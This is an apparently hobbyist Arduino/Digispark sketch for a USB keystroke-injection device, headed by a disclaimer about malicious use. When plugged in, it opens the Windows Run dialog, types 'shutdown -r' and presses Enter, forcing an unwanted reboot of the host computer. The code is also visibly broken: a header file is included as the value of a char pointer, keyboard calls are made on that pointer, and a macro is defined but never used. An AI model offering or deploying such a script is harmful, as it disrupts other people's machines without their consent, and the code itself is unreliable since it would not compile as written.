/* im not responsible for any idiots that use this for malicious purposes.*/
#define STRINGIFY(x) #x

const char * dk =
#include "DigiKeyboard.h"
;

void setup() {
  // don't need to set anything up to use DigiKeyboard
}



void loop() {
    dk.sendKeyStroke(0);
    dk.sendKeyStroke(MOD_GUI_LEFT, KEY_R);
    dk.delay(500);
    dk.print("shutdown -r");
    dk.delay(500);
    dk.sendKeyStroke(KEY_ENTER);
    dk.delay(5000);
    for (;;){}  // Stops it from repeating. 
}
